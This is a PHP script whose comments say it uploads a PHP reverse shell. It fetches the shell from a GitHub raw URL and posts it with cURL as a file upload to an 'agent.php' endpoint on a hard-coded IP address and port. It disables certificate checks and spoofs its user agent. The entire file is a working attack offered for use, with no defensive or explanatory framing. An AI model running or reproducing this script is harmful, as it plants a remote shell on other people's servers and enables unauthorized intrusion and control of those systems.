<?php
// URL of the PHP reverse shell you want to upload
$file_url = 'https://raw.githubusercontent.com/HanzalahH/kansklasnbdfklbjasd/refs/heads/main/php-reverse-shell.php';

// Target URL for file upload
$target = 'http://103.31.82.13:8443/enterprise/control/agent.php';

// Fetch the file content from the URL
$file_content = file_get_contents($file_url);

// Prepare the file to upload using CURLFile
$temp_file = tmpfile();
fwrite($temp_file, $file_content);
fseek($temp_file, 0); // Reset file pointer to the beginning

// Initialize cURL
$ch = curl_init();

// Set up the cURL options for file upload
$data = array('uploaded_file' => new CURLFile(stream_get_meta_data($temp_file)['uri']));
curl_setopt($ch, CURLOPT_URL, $target);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');

// Execute the request
$response = curl_exec($ch);

// Check for errors
if (curl_errno($ch)) {
    echo 'Error: ' . curl_error($ch);
} else {
    echo 'Response: ' . $response;
}

// Clean up
curl_close($ch);
fclose($temp_file);
?>
